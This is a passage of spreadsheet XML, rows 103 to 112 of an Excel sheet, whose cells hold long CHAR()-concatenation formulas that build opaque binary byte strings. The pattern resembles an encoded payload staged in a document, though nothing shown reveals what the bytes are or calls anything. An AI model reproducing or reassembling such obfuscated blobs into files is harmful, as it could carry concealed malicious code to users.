(82)&amp;CHAR(244)&amp;CHAR(147)&amp;CHAR(162)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(135)&amp;CHAR(197)&amp;CHAR(8)&amp;CHAR(147)&amp;CHAR(131)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(130)&amp;CHAR(78)&amp;CHAR(45)&amp;CHAR(22)&amp;CHAR(84)&amp;CHAR(142)&amp;CHAR(129)&amp;CHAR(235)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(84)&amp;CHAR(109)&amp;CHAR(6)&amp;CHAR(94)&amp;CHAR(135)&amp;CHAR(143)&amp;CHAR(209)&amp;CHAR(2)&amp;CHAR(15)&amp;CHAR(11)&amp;CHAR(90)&amp;CHAR(246)&amp;CHAR(145)&amp;CHAR(169)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(135)&amp;CHAR(194)&amp;CHAR(119)&amp;CHAR(103)&amp;CHAR(142)&amp;CHAR(77)&amp;CHAR(45)&amp;CHAR(21)&amp;CHAR(136)&amp;CHAR(89)&amp;CHAR(42)&amp;CHAR(47)&amp;CHAR(80)&amp;CHAR(87)&amp;CHAR(81)&amp;CHAR(137)&amp;CHAR(3)&amp;CHAR(245)&amp;CHAR(147)&amp;CHAR(15)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(128)&amp;CHAR(199)&amp;CHAR(126)&amp;CHAR(69)&amp;CHAR(108)&amp;CHAR(52)&amp;CHAR(110)&amp;CHAR(46)&amp;CHAR(34)&amp;CHAR(113)&amp;CHAR(62)&amp;CHAR(157)&amp;CHAR(72)&amp;CHAR(37)&amp;CHAR(17)&amp;CHAR(143)&amp;CHAR(75)&amp;CHAR(46)&amp;CHAR(29)&amp;CHAR(86)&amp;CHAR(137)&amp;CHAR(133)&amp;CHAR(251)&amp;CHAR(3)&amp;CHAR(14)&amp;CHAR(5)&amp;CHAR(91)&amp;CHAR(143)&amp;CHAR(22)&amp;CHAR(86)&amp;CHAR(244)&amp;CHAR(24)&amp;CHAR(140)&amp;CHAR(205)&amp;CHAR(115)&amp;CHAR(47)&amp;CHAR(128)&amp;CHAR(78)&amp;CHAR(45)&amp;CHAR(23)&amp;CHAR(136)&amp;CHAR(83)&amp;CHAR(46)&amp;CHAR(17)&amp;CHAR(80)&amp;CHAR(253)&amp;CHAR(118)&amp;CHAR(34)&amp;CHAR(29)&amp;CHAR(130)&amp;CHAR(1)&amp;CHAR(85)&amp;CHAR(250)&amp;CHAR(156)&amp;CHAR(130)&amp;CHAR(15)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(138)&amp;CHAR(70)&amp;CHAR(47)&amp;CHAR(30)&amp;CHAR(82)&amp;CHAR(128)&amp;CHAR(3)&amp;CHAR(253)&amp;CHAR(87)&amp;CHAR(13)&amp;CHAR(140)&amp;CHAR(79)&amp;CHAR(33)&amp;CHAR(26)&amp;CHAR(93)&amp;CHAR(137)&amp;CHAR(2)&amp;CHAR(253)&amp;CHAR(84)&amp;CHAR(15)&amp;CHAR(233)&amp;CHAR(146)&amp;CHAR(177)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(15)&amp;CHAR(129)&amp;CHAR(143)</f>
        <v>ZMYQVQˆÃÝ_x0007_
	Áî
V\_Žq)_x0012_Xº_x000D__x0007__x000B_
_x0003_†µJ_x0001__x0005__x0007__x0007_2‰ŒB_x0002__x0007__x0016_7ìk_x0006_g
9_x0006__x0004_Ž_x0003_B_x000C__x0005__x000B__x0004_WRô\5†ÞŠÐ_x0005_Ö_x0005__x0007_
‚_x0012__x001B__x0006__x0005_
ÀTVgñ‚_x001C__x0018__x0002__x000B_[W^ôTVPRô“¢_x000D__x0002_
‡Å_x0008_“ƒ_x0001__x0001__x0002_‚N-_x0016_TŽë
_x0005__x000B_Tm_x0006_^‡Ñ_x0002__x000F__x000B_Zö‘©_x0007_
	‡ÂwgŽM-_x0015_ˆY*/PWQ‰_x0003_õ“_x000F_
_x0002__x0006_€Ç~El4n."q&gt;H%_x0011_K._x001D_V‰…û_x0003__x000E__x0005_[_x0016_Vô_x0018_ŒÍs/€N-_x0017_ˆS._x0011_Pýv"_x001D_‚_x0001_Uúœ‚_x000F__x0002__x0004_ŠF/_x001E_R€_x0003_ýW_x000D_ŒO!_x001A_]‰_x0002_ýT_x000F_é’±_x0001__x0002__x000F_</v>
      </c>
      <c r="C103" t="str">
        <f>CHAR(184)&amp;CHAR(244)&amp;CHAR(57)&amp;CHAR(251)&amp;CHAR(74)&amp;CHAR(98)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(188)</f>
        <v>¸ô9ûJb‘[¸¼</v>
      </c>
    </row>
    <row r="104" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B104" t="str">
        <f>CHAR(70)&amp;CHAR(3)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(138)&amp;CHAR(10)&amp;CHAR(64)&amp;CHAR(9)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(91)&amp;CHAR(95)&amp;CHAR(90)&amp;CHAR(229)&amp;CHAR(254)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(138)&amp;CHAR(195)&amp;CHAR(9)&amp;CHAR(111)&amp;CHAR(10)&amp;CHAR(201)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(87)&amp;CHAR(85)&amp;CHAR(250)&amp;CHAR(95)&amp;CHAR(73)&amp;CHAR(90)&amp;CHAR(91)&amp;CHAR(80)&amp;CHAR(85)&amp;CHAR(140)&amp;CHAR(198)&amp;CHAR(8)&amp;CHAR(194)&amp;CHAR(137)&amp;CHAR(79)&amp;CHAR(46)&amp;CHAR(14)&amp;CHAR(204)&amp;CHAR(11)&amp;CHAR(3)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(56)&amp;CHAR(197)&amp;CHAR(200)&amp;CHAR(29)&amp;CHAR(2)&amp;CHAR(129)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(3)&amp;CHAR(61)&amp;CHAR(64)&amp;CHAR(37)&amp;CHAR(9)&amp;CHAR(193)&amp;CHAR(132)&amp;CHAR(78)&amp;CHAR(45)&amp;CHAR(2)&amp;CHAR(157)&amp;CHAR(244)&amp;CHAR(123)&amp;CHAR(35)&amp;CHAR(6)&amp;CHAR(198)&amp;CHAR(227)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(82)&amp;CHAR(138)&amp;CHAR(229)&amp;CHAR(3)&amp;CHAR(204)&amp;CHAR(94)&amp;CHAR(129)&amp;CHAR(229)&amp;CHAR(99)&amp;CHAR(164)&amp;CHAR(55)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(49)&amp;CHAR(203)&amp;CHAR(80)&amp;CHAR(142)&amp;CHAR(73)&amp;CHAR(5)&amp;CHAR(142)&amp;CHAR(117)&amp;CHAR(1)&amp;CHAR(229)&amp;CHAR(47)&amp;CHAR(135)&amp;CHAR(205)&amp;CHAR(116)&amp;CHAR(33)&amp;CHAR(244)&amp;CHAR(127)&amp;CHAR(26)&amp;CHAR(244)&amp;CHAR(126)&amp;CHAR(22)&amp;CHAR(249)&amp;CHAR(112)&amp;CHAR(23)&amp;CHAR(244)&amp;CHAR(112)&amp;CHAR(6)&amp;CHAR(93)&amp;CHAR(253)&amp;CHAR(127)&amp;CHAR(10)&amp;CHAR(237)&amp;CHAR(139)&amp;CHAR(251)&amp;CHAR(251)&amp;CHAR(254)&amp;CHAR(138)&amp;CHAR(52)&amp;CHAR(140)&amp;CHAR(206)&amp;CHAR(17)&amp;CHAR(141)&amp;CHAR(204)&amp;CHAR(136)&amp;CHAR(65)&amp;CHAR(31)&amp;CHAR(139)&amp;CHAR(197)&amp;CHAR(126)&amp;CHAR(221)&amp;CHAR(140)&amp;CHAR(198)&amp;CHAR(85)&amp;CHAR(87)&amp;CHAR(202)&amp;CHAR(134)&amp;CHAR(66)&amp;CHAR(43)&amp;CHAR(3)&amp;CHAR(92)&amp;CHAR(130)&amp;CHAR(115)&amp;CHAR(33)&amp;CHAR(15)&amp;CHAR(128)&amp;CHAR(31)&amp;CHAR(134)&amp;CHAR(208)&amp;CHAR(118)&amp;CHAR(18)&amp;CHAR(143)&amp;CHAR(195)&amp;CHAR(34)&amp;CHAR(245)&amp;CHAR(143)&amp;CHAR(220)&amp;CHAR(52)&amp;CHAR(7)&amp;CHAR(119)&amp;CHAR(14)&amp;CHAR(65)&amp;CHAR(136)&amp;CHAR(7)&amp;CHAR(12)&amp;CHAR(136)&amp;CHAR(218)&amp;CHAR(143)&amp;CHAR(203)&amp;CHAR(115)&amp;CHAR(245)&amp;CHAR(8)&amp;CHAR(189)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(187)&amp;CHAR(192)&amp;CHAR(33)&amp;CHAR(195)&amp;CHAR(91)&amp;CHAR(196)&amp;CHAR(149)&amp;CHAR(232)&amp;CHAR(21)&amp;CHAR(82)&amp;CHAR(137)&amp;CHAR(83)&amp;CHAR(46)&amp;CHAR(41)&amp;CHAR(53)&amp;CHAR(196)&amp;CHAR(86)&amp;CHAR(140)&amp;CHAR(107)&amp;CHAR(42)&amp;CHAR(45)&amp;CHAR(93)&amp;CHAR(83)&amp;CHAR(52)&amp;CHAR(248)&amp;CHAR(130)&amp;CHAR(78)&amp;CHAR(45)&amp;CHAR(33)&amp;CHAR(53)&amp;CHAR(249)&amp;CHAR(130)&amp;CHAR(126)&amp;CHAR(45)&amp;CHAR(23)&amp;CHAR(142)&amp;CHAR(75)&amp;CHAR(46)&amp;CHAR(33)&amp;CHAR(136)&amp;CHAR(14)&amp;CHAR(10)&amp;CHAR(130)&amp;CHAR(204)&amp;CHAR(125)&amp;CHAR(24)&amp;CHAR(134)&amp;CHAR(253)&amp;CHAR(77)&amp;CHAR(122)&amp;CHAR(3)&amp;CHAR(138)&amp;CHAR(72)&amp;CHAR(61)&amp;CHAR(22)&amp;CHAR(76)&amp;CHAR(74)&amp;CHAR(139)&amp;CHAR(79)&amp;CHAR(47)&amp;CHAR(46)&amp;CHAR(237)&amp;CHAR(82)&amp;CHAR(109)&amp;CHAR(27)&amp;CHAR(93)&amp;CHAR(33)&amp;CHAR(202)</f>
        <v>F_x0003__x0003__x0007_Š
@	_x0004__x0007__x0007_[_Zåþ_x000D__x000B_
ŠÃ	o
É_x0002__x0002_WUú_IZ[PUŒÆ_x0008_Â‰O._x000E_Ì_x000B__x0003__x0006__x0005__x0007_8ÅÈ_x001D__x0002_F!_x0003_=@%	Á„N-_x0002_ô{#_x0006_Æã_x0004__x0007__x0007__x000B_RŠå_x0003_Ì^åc¤7
	_x0002_1ËPŽI_x0005_Žu_x0001_å/‡Ít!ô_x001A_ô~_x0016_ùp_x0017_ôp_x0006_]ý
í‹ûûþŠ4ŒÎ_x0011_ÌˆA_x001F_‹Å~ÝŒÆUWÊ†B+_x0003_\‚s!_x000F_€_x001F_†Ðv_x0012_Ã"õÜ4_x0007_w_x000E_Aˆ_x0007__x000C_ˆÚËsõ_x0008_½_x000D__x0005_»À!Ã[Ä•è_x0015_R‰S.)5ÄVŒk*-]S4ø‚N-!5ù‚~-_x0017_ŽK.!ˆ_x000E_
‚Ì}_x0018_†ýMz_x0003_ŠH=_x0016_LJ‹O/.íRm_x001B_]!Ê</v>
      </c>
      <c r="C104" t="str">
        <f>CHAR(250)&amp;CHAR(104)&amp;CHAR(237)&amp;CHAR(162)&amp;CHAR(26)&amp;CHAR(87)&amp;CHAR(157)&amp;CHAR(220)&amp;CHAR(113)&amp;CHAR(122)</f>
        <v>úhí¢_x001A_WÜqz</v>
      </c>
    </row>
    <row r="105" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B105" t="str">
        <f>CHAR(143)&amp;CHAR(126)&amp;CHAR(38)&amp;CHAR(17)&amp;CHAR(87)&amp;CHAR(21)&amp;CHAR(243)&amp;CHAR(107)&amp;CHAR(1)&amp;CHAR(84)&amp;CHAR(231)&amp;CHAR(247)&amp;CHAR(8)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(128)&amp;CHAR(195)&amp;CHAR(11)&amp;CHAR(200)&amp;CHAR(3)&amp;CHAR(139)&amp;CHAR(135)&amp;CHAR(248)&amp;CHAR(11)&amp;CHAR(121)&amp;CHAR(43)&amp;CHAR(92)&amp;CHAR(128)&amp;CHAR(66)&amp;CHAR(43)&amp;CHAR(19)&amp;CHAR(89)&amp;CHAR(89)&amp;CHAR(239)&amp;CHAR(91)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(104)&amp;CHAR(18)&amp;CHAR(49)&amp;CHAR(222)&amp;CHAR(54)&amp;CHAR(227)&amp;CHAR(132)&amp;CHAR(65)&amp;CHAR(33)&amp;CHAR(41)&amp;CHAR(100)&amp;CHAR(15)&amp;CHAR(82)&amp;CHAR(236)&amp;CHAR(213)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(129)&amp;CHAR(207)&amp;CHAR(19)&amp;CHAR(137)&amp;CHAR(66)&amp;CHAR(33)&amp;CHAR(43)&amp;CHAR(128)&amp;CHAR(113)&amp;CHAR(46)&amp;CHAR(29)&amp;CHAR(195)&amp;CHAR(234)&amp;CHAR(1)&amp;CHAR(67)&amp;CHAR(109)&amp;CHAR(6)&amp;CHAR(141)&amp;CHAR(69)&amp;CHAR(37)&amp;CHAR(38)&amp;CHAR(80)&amp;CHAR(131)&amp;CHAR(125)&amp;CHAR(34)&amp;CHAR(20)&amp;CHAR(128)&amp;CHAR(248)&amp;CHAR(23)&amp;CHAR(123)&amp;CHAR(16)&amp;CHAR(94)&amp;CHAR(137)&amp;CHAR(67)&amp;CHAR(35)&amp;CHAR(19)&amp;CHAR(89)&amp;CHAR(89)&amp;CHAR(229)&amp;CHAR(39)&amp;CHAR(15)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(138)&amp;CHAR(195)&amp;CHAR(9)&amp;CHAR(52)&amp;CHAR(210)&amp;CHAR(58)&amp;CHAR(232)&amp;CHAR(49)&amp;CHAR(253)&amp;CHAR(141)&amp;CHAR(65)&amp;CHAR(45)&amp;CHAR(37)&amp;CHAR(128)&amp;CHAR(243)&amp;CHAR(2)&amp;CHAR(138)&amp;CHAR(104)&amp;CHAR(253)&amp;CHAR(251)&amp;CHAR(254)&amp;CHAR(93)&amp;CHAR(85)&amp;CHAR(129)&amp;CHAR(215)&amp;CHAR(128)&amp;CHAR(200)&amp;CHAR(95)&amp;CHAR(93)&amp;CHAR(134)&amp;CHAR(195)&amp;CHAR(31)&amp;CHAR(198)&amp;CHAR(137)&amp;CHAR(225)&amp;CHAR(18)&amp;CHAR(129)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(31)&amp;CHAR(157)&amp;CHAR(80)&amp;CHAR(37)&amp;CHAR(29)&amp;CHAR(81)&amp;CHAR(90)&amp;CHAR(92)&amp;CHAR(130)&amp;CHAR(114)&amp;CHAR(32)&amp;CHAR(35)&amp;CHAR(52)&amp;CHAR(220)&amp;CHAR(89)&amp;CHAR(136)&amp;CHAR(119)&amp;CHAR(32)&amp;CHAR(23)&amp;CHAR(162)&amp;CHAR(174)&amp;CHAR(175)&amp;CHAR(172)&amp;CHAR(134)&amp;CHAR(74)&amp;CHAR(43)&amp;CHAR(31)&amp;CHAR(129)&amp;CHAR(125)&amp;CHAR(35)&amp;CHAR(25)&amp;CHAR(140)&amp;CHAR(102)&amp;CHAR(45)&amp;CHAR(26)&amp;CHAR(137)&amp;CHAR(126)&amp;CHAR(34)&amp;CHAR(21)&amp;CHAR(128)&amp;CHAR(69)&amp;CHAR(33)&amp;CHAR(45)&amp;CHAR(134)&amp;CHAR(192)&amp;CHAR(206)&amp;CHAR(202)&amp;CHAR(12)&amp;CHAR(138)&amp;CHAR(118)&amp;CHAR(47)&amp;CHAR(34)&amp;CHAR(1)&amp;CHAR(201)&amp;CHAR(202)&amp;CHAR(204)&amp;CHAR(14)&amp;CHAR(54)&amp;CHAR(192)&amp;CHAR(8)&amp;CHAR(242)&amp;CHAR(203)&amp;CHAR(207)&amp;CHAR(1)&amp;CHAR(57)&amp;CHAR(241)&amp;CHAR(196)&amp;CHAR(192)&amp;CHAR(21)&amp;CHAR(55)&amp;CHAR(209)&amp;CHAR(136)&amp;CHAR(110)&amp;CHAR(43)&amp;CHAR(34)&amp;CHAR(58)&amp;CHAR(248)&amp;CHAR(143)&amp;CHAR(234)&amp;CHAR(68)&amp;CHAR(132)&amp;CHAR(245)&amp;CHAR(30)&amp;CHAR(121)&amp;CHAR(210)&amp;CHAR(88)&amp;CHAR(89)&amp;CHAR(86)&amp;CHAR(81)&amp;CHAR(138)&amp;CHAR(201)&amp;CHAR(22)&amp;CHAR(204)&amp;CHAR(128)&amp;CHAR(94)&amp;CHAR(45)&amp;CHAR(23)&amp;CHAR(134)&amp;CHAR(235)&amp;CHAR(30)&amp;CHAR(90)&amp;CHAR(137)&amp;CHAR(94)&amp;CHAR(38)&amp;CHAR(34)&amp;CHAR(128)&amp;CHAR(219)&amp;CHAR(6)&amp;CHAR(129)&amp;CHAR(237)&amp;CHAR(13)&amp;CHAR(14)&amp;CHAR(15)&amp;CHAR(137)&amp;CHAR(64)&amp;CHAR(37)&amp;CHAR(34)</f>
        <v>~&amp;_x0011_W_x0015_ók_x0001_Tç÷_x0008__x0006__x0004_€Ã_x000B_È_x0003_‹‡ø_x000B_y+\€B+_x0013_YYï[_x0007_
	h_x0012_1Þ6ã„A!)d_x000F_RìÕ_x0003__x000B_
Ï_x0013_‰B!+€q._x001D_Ãê_x0001_Cm_x0006_E%&amp;Pƒ}"_x0014_€ø_x0017_{_x0010_^‰C#_x0013_YYå'_x000F__x000B_
ŠÃ	4Ò:è1ýA-%€ó_x0002_Šhýûþ]U×€È_]†Ã_x001F_Æ‰á_x0012_F!_x001F_P%_x001D_QZ\‚r #4ÜYˆw _x0017_¢®¯¬†J+_x001F_}#_x0019_Œf-_x001A_‰~"_x0015_€E!-†ÀÎÊ_x000C_Šv/"_x0001_ÉÊÌ_x000E_6À_x0008_òËÏ_x0001_9ñÄÀ_x0015_7Ñˆn+":øêD„õ_x001E_yÒXYVQŠÉ_x0016_Ì€^-_x0017_†ë_x001E_Z‰^&amp;"€Û_x0006_í_x000D__x000E__x000F_‰@%"</v>
      </c>
      <c r="C105" t="str">
        <f>CHAR(136)&amp;CHAR(162)&amp;CHAR(18)&amp;CHAR(154)&amp;CHAR(192)&amp;CHAR(188)&amp;CHAR(250)&amp;CHAR(115)&amp;CHAR(119)&amp;CHAR(122)</f>
        <v>ˆ¢_x0012_šÀ¼úswz</v>
      </c>
    </row>
    <row r="106" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B106" t="str">
        <f>CHAR(94)&amp;CHAR(57)&amp;CHAR(239)&amp;CHAR(78)&amp;CHAR(93)&amp;CHAR(143)&amp;CHAR(78)&amp;CHAR(10)&amp;CHAR(44)&amp;CHAR(227)&amp;CHAR(82)&amp;CHAR(131)&amp;CHAR(65)&amp;CHAR(38)&amp;CHAR(26)&amp;CHAR(139)&amp;CHAR(105)&amp;CHAR(35)&amp;CHAR(34)&amp;CHAR(143)&amp;CHAR(241)&amp;CHAR(140)&amp;CHAR(126)&amp;CHAR(43)&amp;CHAR(30)&amp;CHAR(58)&amp;CHAR(207)&amp;CHAR(161)&amp;CHAR(166)&amp;CHAR(162)&amp;CHAR(162)&amp;CHAR(133)&amp;CHAR(113)&amp;CHAR(47)&amp;CHAR(44)&amp;CHAR(140)&amp;CHAR(3)&amp;CHAR(133)&amp;CHAR(59)&amp;CHAR(77)&amp;CHAR(129)&amp;CHAR(18)&amp;CHAR(78)&amp;CHAR(136)&amp;CHAR(243)&amp;CHAR(13)&amp;CHAR(117)&amp;CHAR(246)&amp;CHAR(140)&amp;CHAR(126)&amp;CHAR(45)&amp;CHAR(34)&amp;CHAR(137)&amp;CHAR(70)&amp;CHAR(34)&amp;CHAR(25)&amp;CHAR(130)&amp;CHAR(117)&amp;CHAR(33)&amp;CHAR(29)&amp;CHAR(134)&amp;CHAR(66)&amp;CHAR(43)&amp;CHAR(22)&amp;CHAR(195)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(59)&amp;CHAR(26)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(1)&amp;CHAR(201)&amp;CHAR(6)&amp;CHAR(193)&amp;CHAR(202)&amp;CHAR(194)&amp;CHAR(15)&amp;CHAR(62)&amp;CHAR(251)&amp;CHAR(203)&amp;CHAR(196)&amp;CHAR(13)&amp;CHAR(52)&amp;CHAR(230)&amp;CHAR(197)&amp;CHAR(192)&amp;CHAR(17)&amp;CHAR(1)&amp;CHAR(200)&amp;CHAR(9)&amp;CHAR(199)&amp;CHAR(199)&amp;CHAR(195)&amp;CHAR(4)&amp;CHAR(198)&amp;CHAR(193)&amp;CHAR(3)&amp;CHAR(54)&amp;CHAR(243)&amp;CHAR(55)&amp;CHAR(246)&amp;CHAR(198)&amp;CHAR(203)&amp;CHAR(26)&amp;CHAR(138)&amp;CHAR(97)&amp;CHAR(34)&amp;CHAR(63)&amp;CHAR(10)&amp;CHAR(127)&amp;CHAR(222)&amp;CHAR(140)&amp;CHAR(105)&amp;CHAR(35)&amp;CHAR(34)&amp;CHAR(128)&amp;CHAR(78)&amp;CHAR(38)&amp;CHAR(22)&amp;CHAR(53)&amp;CHAR(204)&amp;CHAR(128)&amp;CHAR(125)&amp;CHAR(33)&amp;CHAR(37)&amp;CHAR(132)&amp;CHAR(114)&amp;CHAR(43)&amp;CHAR(26)&amp;CHAR(141)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(23)&amp;CHAR(129)&amp;CHAR(70)&amp;CHAR(134)&amp;CHAR(11)&amp;CHAR(51)&amp;CHAR(66)&amp;CHAR(137)&amp;CHAR(19)&amp;CHAR(74)&amp;CHAR(134)&amp;CHAR(243)&amp;CHAR(9)&amp;CHAR(112)&amp;CHAR(248)&amp;CHAR(137)&amp;CHAR(105)&amp;CHAR(35)&amp;CHAR(34)&amp;CHAR(143)&amp;CHAR(203)&amp;CHAR(107)&amp;CHAR(18)&amp;CHAR(87)&amp;CHAR(49)&amp;CHAR(217)&amp;CHAR(9)&amp;CHAR(67)&amp;CHAR(203)&amp;CHAR(130)&amp;CHAR(206)&amp;CHAR(112)&amp;CHAR(28)&amp;CHAR(134)&amp;CHAR(120)&amp;CHAR(35)&amp;CHAR(19)&amp;CHAR(128)&amp;CHAR(249)&amp;CHAR(34)&amp;CHAR(246)&amp;CHAR(141)&amp;CHAR(230)&amp;CHAR(129)&amp;CHAR(14)&amp;CHAR(62)&amp;CHAR(55)&amp;CHAR(3)&amp;CHAR(65)&amp;CHAR(137)&amp;CHAR(228)&amp;CHAR(3)&amp;CHAR(119)&amp;CHAR(247)&amp;CHAR(141)&amp;CHAR(105)&amp;CHAR(45)&amp;CHAR(61)&amp;CHAR(46)&amp;CHAR(212)&amp;CHAR(14)&amp;CHAR(215)&amp;CHAR(132)&amp;CHAR(78)&amp;CHAR(32)&amp;CHAR(17)&amp;CHAR(130)&amp;CHAR(10)&amp;CHAR(11)&amp;CHAR(119)&amp;CHAR(3)&amp;CHAR(66)&amp;CHAR(143)&amp;CHAR(2)&amp;CHAR(44)&amp;CHAR(130)&amp;CHAR(203)&amp;CHAR(122)&amp;CHAR(249)&amp;CHAR(134)&amp;CHAR(70)&amp;CHAR(46)&amp;CHAR(46)&amp;CHAR(128)&amp;CHAR(213)&amp;CHAR(25)&amp;CHAR(129)&amp;CHAR(51)&amp;CHAR(254)&amp;CHAR(253)&amp;CHAR(240)&amp;CHAR(85)&amp;CHAR(87)&amp;CHAR(91)&amp;CHAR(95)&amp;CHAR(128)&amp;CHAR(195)&amp;CHAR(19)&amp;CHAR(205)&amp;CHAR(142)&amp;CHAR(95)&amp;CHAR(32)&amp;CHAR(11)&amp;CHAR(140)&amp;CHAR(79)&amp;CHAR(46)&amp;CHAR(13)&amp;CHAR(91)&amp;CHAR(141)&amp;CHAR(255)&amp;CHAR(142)&amp;CHAR(216)&amp;CHAR(125)&amp;CHAR(20)&amp;CHAR(82)&amp;CHAR(140)&amp;CHAR(118)&amp;CHAR(45)&amp;CHAR(18)&amp;CHAR(41)&amp;CHAR(250)</f>
        <v>^9ïN]N
,ãRƒA&amp;_x001A_‹i#"ñŒ~+_x001E_:Ï¡¦¢¢…q/,Œ_x0003_…;M_x0012_Nˆó_x000D_uöŒ~-"‰F"_x0019_‚u!_x001D_†B+_x0016_ÃE&amp;;_x001A__x0002__x000B__x000B__x0001_É_x0006_ÁÊÂ_x000F_&gt;ûËÄ_x000D_4æÅÀ_x0011__x0001_È	ÇÇÃ_x0004_ÆÁ_x0003_6ó7öÆË_x001A_Ša"?
ÞŒi#"€N&amp;_x0016_5Ì€}!%„r+_x001A_E&amp;_x0017_F†_x000B_3B‰_x0013_J†ó	pø‰i#"Ëk_x0012_W1Ù	CË‚Îp_x001C_†x#_x0013_€ù"öæ_x000E_&gt;7_x0003_A‰ä_x0003_w÷i-=.Ô_x000E_×„N _x0011_‚
_x000B_w_x0003_B_x0002_,‚Ëzù†F..€Õ_x0019_3þýðUW[_€Ã_x0013_ÍŽ_ _x000B_ŒO._x000D_[ÿŽØ}_x0014_RŒv-_x0012_)ú</v>
      </c>
      <c r="C106" t="str">
        <f>CHAR(249)&amp;CHAR(90)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(244)&amp;CHAR(186)&amp;CHAR(135)&amp;CHAR(111)&amp;CHAR(138)&amp;CHAR(90)</f>
        <v>ùZ¸ôôº‡oŠZ</v>
      </c>
    </row>
    <row r="107" spans="2:3" ht="99.75" x14ac:dyDescent="0.45">
      <c r="B107" t="str">
        <f>CHAR(140)&amp;CHAR(9)&amp;CHAR(62)&amp;CHAR(129)&amp;CHAR(11)&amp;CHAR(67)&amp;CHAR(142)&amp;CHAR(228)&amp;CHAR(14)&amp;CHAR(119)&amp;CHAR(241)&amp;CHAR(94)&amp;CHAR(92)&amp;CHAR(200)&amp;CHAR(128)&amp;CHAR(70)&amp;CHAR(47)&amp;CHAR(3)&amp;CHAR(137)&amp;CHAR(74)&amp;CHAR(33)&amp;CHAR(11)&amp;CHAR(92)&amp;CHAR(142)&amp;CHAR(118)&amp;CHAR(41)&amp;CHAR(10)&amp;CHAR(249)&amp;CHAR(168)&amp;CHAR(142)&amp;CHAR(67)&amp;CHAR(50)&amp;CHAR(12)&amp;CHAR(94)&amp;CHAR(194)&amp;CHAR(2)&amp;CHAR(108)&amp;CHAR(11)&amp;CHAR(9)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(14)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(11)&amp;CHAR(41)&amp;CHAR(106)&amp;CHAR(185)</f>
        <v>Œ	&gt;_x000B_CŽä_x000E_wñ^\È€F/_x0003_‰J!_x000B_\Žv)
ù¨ŽC2_x000C_^Â_x0002_l_x000B_	_x0006__x0004__x0003__x0007__x0007__x000E__x0005__x000B__x0004__x0007__x0004__x000B_
	_x0005__x0006__x000F__x000B_)j¹</v>
      </c>
      <c r="C107" t="str">
        <f>CHAR(184)&amp;CHAR(244)&amp;CHAR(48)&amp;CHAR(194)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(240)&amp;CHAR(197)</f>
        <v>¸ô0Âˆê‘[ðÅ</v>
      </c>
    </row>
    <row r="108" spans="2:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="B108" t="s">
        <v>37</v>
      </c>
      <c r="C108" t="str">
        <f>CHAR(163)&amp;CHAR(195)&amp;CHAR(132)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(221)&amp;CHAR(188)&amp;CHAR(250)&amp;CHAR(78)</f>
        <v>£Ã„ê‘[Ý¼úN</v>
      </c>
    </row>
    <row r="109" spans="2:3" x14ac:dyDescent="0.45">
      <c r="C109" t="str">
        <f>CHAR(173)&amp;CHAR(194)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(11)&amp;CHAR(39)&amp;CHAR(74)&amp;CHAR(13)&amp;CHAR(42)</f>
        <v>­Â‘[¸_x000B_'J_x000D_*</v>
      </c>
    </row>
    <row r="110" spans="2:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C110" t="str">
        <f>CHAR(158)&amp;CHAR(223)&amp;CHAR(65)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(237)&amp;CHAR(162)&amp;CHAR(26)&amp;CHAR(79)</f>
        <v>žßAôqzí¢_x001A_O</v>
      </c>
    </row>
    <row r="111" spans="2:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C111" t="str">
        <f>CHAR(157)&amp;CHAR(220)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(162)&amp;CHAR(24)&amp;CHAR(217)&amp;CHAR(160)&amp;CHAR(245)</f>
        <v>Üqzˆ¢_x0018_Ù õ</v>
      </c>
    </row>
    <row r="112" spans="2:3" ht="28.5" x14ac:dyDescent="0.45">
